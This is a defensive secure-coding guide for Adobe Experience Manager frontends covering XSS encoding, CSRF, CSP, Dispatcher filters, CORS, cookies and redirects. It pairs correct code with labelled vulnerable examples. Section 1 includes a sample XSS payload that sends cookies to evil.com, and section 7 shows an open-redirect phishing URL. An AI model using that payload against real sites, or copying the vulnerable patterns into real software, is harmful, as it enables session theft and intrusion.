---
title: AEM Frontend Security Patterns
impact: CRITICAL
impactDescription: Security vulnerabilities in AEM frontends expose sites to XSS, CSRF, clickjacking, and data theft — often with legal and compliance consequences
tags: security, xss, csrf, htl, csp, cors, dispatcher, cug, clickjacking, cookies, json, sling-servlet
---

## AEM Frontend Security Patterns

AEM provides built-in security mechanisms through HTL display contexts, CSRF tokens, Dispatcher filters, and Sling-level protections. These patterns must be understood and applied consistently across custom components.

---

### 1. XSS Prevention in HTL (Display Contexts)

HTL (Sightly) automatically applies context-aware output encoding. The `@ context` option controls which encoding is applied. The default context for element content is `html`, which is safe for most cases.

**Available display contexts:**

| Context | Encoding | Use When |
|---------|----------|----------|
| `html` | HTML entity encoding (default for content) | Outputting text inside HTML elements |
| `text` | HTML entity encoding | Same as `html`, explicit text content |
| `attribute` | Attribute encoding (default for attributes) | Outputting values in HTML attributes |
| `uri` | URI encoding | Outputting in `href` or `src` attributes |
| `number` | Numeric only | Outputting numbers (strips non-numeric) |
| `scriptString` | JavaScript string escaping | Outputting inside JS string literals |
| `scriptComment` | JS comment escaping | Outputting inside JS comments |
| `styleString` | CSS string escaping | Outputting inside CSS strings |
| `styleToken` | CSS token validation | Outputting CSS identifiers |
| `scriptToken` | JS identifier validation | Outputting JS identifiers |
| `unsafe` | **No encoding** | **Never use with user input** |

**Correct -- let HTL apply automatic context encoding:**

```html
<!-- HTL automatically selects the right context -->
<h1>${currentPage.title}</h1>                          <!-- context='html' (auto) -->
<a href="${link.url}">Click here</a>                   <!-- context='uri' (auto for href) -->
<div class="${component.cssClass}">Content</div>       <!-- context='attribute' (auto) -->
<img alt="${image.alt}" src="${image.src}" />           <!-- context='attribute' + 'uri' (auto) -->
```

**Correct -- explicit context when needed:**

```html
<!-- Inside a script block, use scriptString -->
<script>
    var pageTitle = "${currentPage.title @ context='scriptString'}";
    var config = {
        path: "${resource.path @ context='scriptString'}",
        id: ${component.id @ context='number'}
    };
</script>

<!-- Inside a style block, use styleString or styleToken -->
<style>
    .cmp-hero { background-color: ${heroColor @ context='styleToken'}; }
</style>
```

**Incorrect -- using `context='unsafe'` with user input:**

```html
<!-- DANGEROUS: disables all XSS protection -->
<div>${userComment @ context='unsafe'}</div>
<!-- An author or user could inject: <script>document.location='https://evil.com/?c='+document.cookie</script> -->

<!-- DANGEROUS: using unsafe for rich text without sanitization -->
<div>${properties.richText @ context='unsafe'}</div>
<!-- Even authored rich text can contain malicious scripts if pasted from external sources -->
```

**Correct -- rich text output with the `html` context:**

```html
<!-- The html context strips dangerous tags (script, iframe, event handlers) via AntiSamy -->
<div>${properties.richText @ context='html'}</div>
```

**When `context='unsafe'` is genuinely needed** (server-generated trusted markup only):

```html
<!-- Only use for content built entirely in a Sling Model with proper escaping -->
<sly data-sly-use.schema="com.myproject.models.SchemaModel">
    <script type="application/ld+json">${schema.jsonLd @ context='unsafe'}</script>
</sly>
<!-- The Sling Model uses Gson to produce valid, escaped JSON — never author-entered HTML -->
```

---

### 2. CSRF Protection

AEM requires a valid CSRF token for authenticated POST, PUT, and DELETE requests to both Author and Publish. The token is obtained from the `/libs/granite/csrf/token.json` endpoint.

**Correct -- include CSRF token in forms:**

```html
<!-- Use the granite.csrf.standalone clientlib for automatic token injection -->
<sly data-sly-use.clientlib="/libs/granite/sightly/templates/clientlib.html">
    <sly data-sly-call="${clientlib.js @ categories='granite.csrf.standalone'}" />
</sly>

<form method="POST" action="/content/mysite/en/contact/jcr:content/form">
    <!-- granite.csrf.standalone automatically adds the :cq_csrf_token hidden field -->
    <input type="text" name="name" />
    <input type="email" name="email" />
    <button type="submit">Submit</button>
</form>
```

**Correct -- CSRF token in AJAX requests:**

```javascript
// Fetch the CSRF token, then include it in the request
function getCsrfToken() {
    return fetch('/libs/granite/csrf/token.json', {
        credentials: 'same-origin'
    })
    .then(function(response) { return response.json(); })
    .then(function(data) { return data.token; });
}

// Use the token in a POST request
getCsrfToken().then(function(token) {
    fetch('/content/mysite/en/api/submit', {
        method: 'POST',
        credentials: 'same-origin',
        headers: {
            'CSRF-Token': token,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ name: 'Test' })
    });
});
```

**Incorrect -- submitting forms without CSRF protection:**

```html
<!-- VULNERABLE: No CSRF token — attacker can forge requests from external sites -->
<form method="POST" action="/content/mysite/en/userprofile">
    <input type="text" name="displayName" />
    <button type="submit">Save</button>
</form>

<!-- WRONG: Hardcoded or cached token — tokens expire and must be fetched fresh -->
<input type="hidden" name=":cq_csrf_token" value="hardcoded-old-token" />
```

---

### 3. Content Security Policy (CSP) Headers

Configure CSP headers in the Dispatcher or via AEM OSGi configuration to prevent inline script injection and unauthorized resource loading.

**Dispatcher configuration (Apache):**

```apache
# /etc/httpd/conf.d/security-headers.conf
<IfModule mod_headers.c>
    # Content Security Policy
    Header always set Content-Security-Policy "\
        default-src 'self'; \
        script-src 'self' https://assets.adobedtm.com https://www.googletagmanager.com; \
        style-src 'self' 'unsafe-inline'; \
        img-src 'self' data: https://images.mysite.com https://*.scene7.com; \
        font-src 'self' https://fonts.gstatic.com; \
        connect-src 'self' https://dpm.demdex.net https://*.omtrdc.net; \
        frame-ancestors 'self'; \
        base-uri 'self'; \
        form-action 'self';"

    # Additional security headers
    Header always set X-Content-Type-Options "nosniff"
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"
</IfModule>
```

**Important:** `'unsafe-inline'` for `style-src` is often required because AEM Core Components output some inline styles. Avoid `'unsafe-inline'` for `script-src` -- use nonce-based CSP or `strict-dynamic` instead if inline scripts are needed.

**Nonce-based CSP for inline scripts:**

```html
<!-- Generate a nonce server-side in the Sling Model -->
<sly data-sly-use.csp="com.myproject.models.CspNonceModel">
    <meta http-equiv="Content-Security-Policy"
          content="script-src 'self' 'nonce-${csp.nonce}';" />
    <script nonce="${csp.nonce}">
        // This inline script is allowed because the nonce matches
        window.siteConfig = { contextPath: '${request.contextPath @ context="scriptString"}' };
    </script>
</sly>
```

---

### 4. Closed User Group (CUG) and Authentication-Aware Frontend

CUGs restrict content access to authenticated users. The frontend must handle the authentication flow gracefully.

**Correct -- detect authentication state and redirect:**

```javascript
// Check if the user is authenticated before accessing protected content
function checkAuth() {
    return fetch('/libs/granite/security/currentuser.json', {
        credentials: 'same-origin'
    })
    .then(function(response) { return response.json(); })
    .then(function(user) {
        return user.authorizableId !== 'anonymous';
    });
}

// Redirect to login if accessing CUG-protected content
function loadProtectedContent(url) {
    fetch(url, { credentials: 'same-origin' })
        .then(function(response) {
            if (response.status === 403 || response.redirected) {
                window.location.href = '/content/mysite/en/login.html?resource=' +
                    encodeURIComponent(window.location.pathname);
            }
            return response.text();
        })
        .then(function(html) {
            document.querySelector('.protected-content').innerHTML = html;
        });
}
```

**Incorrect -- exposing protected content in page source:**

```html
<!-- WRONG: Content is in the HTML even if hidden by CSS — authenticated or not -->
<div class="protected-content" style="display: none;">
    <p>Secret pricing: $999</p>
</div>
<script>
    if (isLoggedIn) {
        document.querySelector('.protected-content').style.display = 'block';
    }
</script>
<!-- Anyone can view source or disable CSS to see the hidden content -->
```

---

### 5. Dispatcher Security Filters

The Dispatcher must block access to sensitive AEM endpoints and restrict request patterns.

**Correct -- deny rules for sensitive paths:**

```
# dispatcher/src/conf.dispatcher.d/filters/filters.any

# Deny everything by default
/0001 { /type "deny" /url "*" }

# Allow published content
/0010 { /type "allow" /method "GET" /url "/content/*" }
/0011 { /type "allow" /method "GET" /url "/etc.clientlibs/*" }
/0012 { /type "allow" /method "GET" /url "/libs/granite/csrf/token.json" }

# Block sensitive AEM endpoints
/0100 { /type "deny" /url "/system/*" }
/0101 { /type "deny" /url "/apps/*" }
/0102 { /type "deny" /url "/libs/*" }
/0103 { /type "deny" /url "/etc/*" }
/0104 { /type "deny" /url "/var/*" }
/0105 { /type "deny" /url "/bin/*" }
/0106 { /type "deny" /url "/crx/*" }
/0107 { /type "deny" /url "/jcr:*" }
/0108 { /type "deny" /url "*.infinity.json" }
/0109 { /type "deny" /url "*.tidy.json" }
/0110 { /type "deny" /url "*.sysview.xml" }
/0111 { /type "deny" /url "*.docview.xml" }
/0112 { /type "deny" /url "*.query.json" }
/0113 { /type "deny" /url "/content/*.feed.xml" }

# Block selector-based content traversal
/0120 { /type "deny" /selectors '(feed|rss|pages|languages|blueprint|hierarchynode|infinity|tidy|sysview|docview|query|childrenlist|ext|userinfo|permissions)' }

# Block dangerous extensions
/0130 { /type "deny" /extension '(json|xml|html|txt)' /url "/content/*/jcr:content*" }
```

**Incorrect -- overly permissive filter:**

```
# DANGEROUS: Allows access to all AEM paths including admin consoles
/0001 { /type "allow" /url "*" }
# An attacker can access /crx/de, /system/console, /bin/querybuilder.json, etc.
```

---

### 6. Sling Servlet Security

Always register servlets by resource type, not by path. Path-based servlets bypass Sling's resource-level access control.

**Correct -- resource type-based servlet:**

```java
@Component(service = Servlet.class, property = {
    "sling.servlet.resourceTypes=myproject/components/api/contact",
    "sling.servlet.methods=POST",
    "sling.servlet.selectors=submit",
    "sling.servlet.extensions=json"
})
public class ContactFormServlet extends SlingAllMethodsServlet {
    @Override
    protected void doPost(SlingHttpServletRequest request,
                          SlingHttpServletResponse response) throws IOException {
        // Access control is enforced by the resource's ACLs
        // Only users with access to the resource can invoke this servlet
        response.setContentType("application/json");
        response.getWriter().write("{\"status\":\"ok\"}");
    }
}
```

**Incorrect -- path-based servlet (bypasses ACLs):**

```java
@Component(service = Servlet.class, property = {
    "sling.servlet.paths=/bin/myproject/contact",  // INSECURE
    "sling.servlet.methods=POST"
})
public class ContactFormServlet extends SlingAllMethodsServlet {
    // Bypasses Sling resource-level ACLs
    // Anyone who can reach the path can invoke the servlet
    // Must manually implement authorization checks
}
```

---

### 7. Safe URL Construction

Use `Granite.HTTP.externalize()` for URL construction to handle context paths correctly and avoid open redirect vulnerabilities.

**Correct -- safe URL construction:**

```javascript
// Use Granite.HTTP for URL operations
var safeUrl = Granite.HTTP.externalize('/content/mysite/en/page.html');

// Validate redirect targets against a whitelist
function safeRedirect(url) {
    var allowedHosts = ['www.mysite.com', 'mysite.com'];
    try {
        var parsedUrl = new URL(url, window.location.origin);
        if (allowedHosts.indexOf(parsedUrl.hostname) === -1) {
            console.warn('Blocked redirect to untrusted host:', parsedUrl.hostname);
            return window.location.origin;
        }
        return parsedUrl.href;
    } catch (e) {
        return window.location.origin;
    }
}

// Encode path segments
var encoded = Granite.HTTP.encodePath('/content/my site/page with spaces');
```

**Incorrect -- constructing URLs from unvalidated input:**

```javascript
// VULNERABLE: Open redirect — attacker controls the 'redirect' parameter
var redirectUrl = new URLSearchParams(window.location.search).get('redirect');
window.location.href = redirectUrl;
// Attacker crafts: https://mysite.com/page?redirect=https://evil.com/phishing

// WRONG: String concatenation without encoding
var url = '/content/mysite/' + userInput + '.html';
// userInput could contain "../" or query parameters to traverse paths
```

---

### 8. Avoiding Client-Side Secrets

Never expose API keys, service credentials, or internal endpoints in frontend code.

**Correct -- proxy through AEM:**

```java
// Server-side proxy: credentials stay on the server
@Component(service = Servlet.class, property = {
    "sling.servlet.resourceTypes=myproject/components/api/weather",
    "sling.servlet.methods=GET",
    "sling.servlet.extensions=json"
})
public class WeatherProxyServlet extends SlingSafeMethodsServlet {

    @Reference
    private WeatherServiceConfig config;  // API key in OSGi config, not in code

    @Override
    protected void doGet(SlingHttpServletRequest request,
                         SlingHttpServletResponse response) throws IOException {
        String city = request.getParameter("city");
        // Call external API with server-side credentials
        String data = weatherClient.fetch(city, config.getApiKey());
        response.setContentType("application/json");
        response.getWriter().write(data);
    }
}
```

**Incorrect -- API key in frontend code:**

```javascript
// EXPOSED: Anyone can view source and steal the API key
var API_KEY = 'sk-12345-secret-key';
fetch('https://api.example.com/data?key=' + API_KEY);

// Also exposed in clientlib JavaScript files:
// /etc.clientlibs/myproject/clientlibs/clientlib-site.js contains the key in plain text
```

---

### 9. CORS Configuration for Headless / API Access

Configure CORS in AEM OSGi for headless GraphQL and API endpoints.

**Correct -- restrictive CORS OSGi configuration:**

```json
{
    "alloworigin": ["https://www.mysite.com", "https://app.mysite.com"],
    "alloworiginregexp": [],
    "allowedpaths": ["/content/graphql/global/endpoint.json", "/content/mysite/.*\\.model\\.json"],
    "supportedheaders": ["Authorization", "Content-Type", "X-Requested-With"],
    "supportedmethods": ["GET", "POST", "OPTIONS"],
    "maxage:Integer": 86400,
    "supportscredentials": true
}
```

**Incorrect -- wildcard CORS:**

```json
{
    "alloworigin": ["*"],
    "allowedpaths": [".*"],
    "supportedheaders": ["*"],
    "supportedmethods": ["*"],
    "supportscredentials": true
}
// DANGEROUS: Allows any origin to make authenticated requests to your AEM instance
// Note: browsers block credentials with wildcard origin, but the intent is still wrong
```

---

### 10. Clickjacking Protection (X-Frame-Options)

Prevent the site from being embedded in malicious iframes.

**Dispatcher configuration:**

```apache
# Prevent clickjacking
Header always set X-Frame-Options "SAMEORIGIN"

# CSP frame-ancestors is the modern replacement
Header always set Content-Security-Policy "frame-ancestors 'self';"
```

**Important:** If the site must be embedded in the AEM Page Editor (author), only apply `X-Frame-Options` on the publish Dispatcher. The author instance needs iframe embedding for the editor to function.

---

### 11. Cookie Security Flags

**Correct -- secure cookie configuration:**

```java
// Set secure cookie attributes in a Sling servlet or filter
Cookie cookie = new Cookie("session_preference", value);
cookie.setSecure(true);       // Only sent over HTTPS
cookie.setHttpOnly(true);     // Not accessible via JavaScript
cookie.setPath("/");
cookie.setMaxAge(3600);
response.addCookie(cookie);

// In AEM Cloud Service, also set SameSite via response header
response.setHeader("Set-Cookie",
    "session_preference=" + value +
    "; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600");
```

**Incorrect -- insecure cookie defaults:**

```java
// INSECURE: Missing Secure, HttpOnly, and SameSite flags
Cookie cookie = new Cookie("user_token", token);
response.addCookie(cookie);
// Token sent over HTTP, accessible via document.cookie, vulnerable to CSRF
```

---

### 12. Safe JSON Rendering (Preventing XSS in JSON Responses)

Sling Model Exporter JSON output must avoid XSS when consumed by frontend code.

**Correct -- set proper Content-Type and use safe insertion:**

```java
@Component(service = Servlet.class, property = {
    "sling.servlet.resourceTypes=myproject/components/api/data",
    "sling.servlet.extensions=json",
    "sling.servlet.methods=GET"
})
public class DataServlet extends SlingSafeMethodsServlet {
    @Override
    protected void doGet(SlingHttpServletRequest request,
                         SlingHttpServletResponse response) throws IOException {
        response.setContentType("application/json");
        response.setCharacterEncoding("UTF-8");
        // Prevent content sniffing
        response.setHeader("X-Content-Type-Options", "nosniff");

        JsonObject data = new JsonObject();
        data.addProperty("title", sanitizedTitle); // Gson handles JSON escaping
        response.getWriter().write(data.toString());
    }
}
```

**Correct -- safe client-side consumption of JSON:**

```javascript
// Use textContent, never innerHTML, for JSON-derived values
fetch('/content/mysite/en/data.model.json')
    .then(function(r) { return r.json(); })
    .then(function(data) {
        // SAFE: textContent does not parse HTML
        document.querySelector('.title').textContent = data.title;

        // SAFE: setAttribute for attribute values
        document.querySelector('a').setAttribute('href', data.link);
    });
```

**Incorrect -- inserting JSON values via innerHTML:**

```javascript
// VULNERABLE: If data.title contains <script>alert('xss')</script>, it executes
fetch('/content/mysite/en/data.model.json')
    .then(function(r) { return r.json(); })
    .then(function(data) {
        document.querySelector('.title').innerHTML = data.title; // XSS
    });
```

---

### Pitfalls

- **Never use `context='unsafe'`** in HTL for author-entered or user-submitted content
- **Never omit CSRF tokens** on POST/PUT/DELETE requests -- use `granite.csrf.standalone` clientlib or fetch tokens via `/libs/granite/csrf/token.json`
- **Never use path-based Sling servlets** -- they bypass resource-level ACLs
- **Never embed API keys or credentials** in ClientLib JavaScript files
- **Never use wildcard CORS** (`*`) with `supportscredentials: true`
- **Never use `innerHTML`** to render values from JSON API responses -- use `textContent`
- **Never allow all Dispatcher paths** -- deny by default, allow only published content paths
- **Always set `X-Content-Type-Options: nosniff`** on JSON API responses
- **Always apply `Secure`, `HttpOnly`, and `SameSite`** flags on authentication cookies
- **Always validate redirect URLs** against a whitelist of allowed hosts
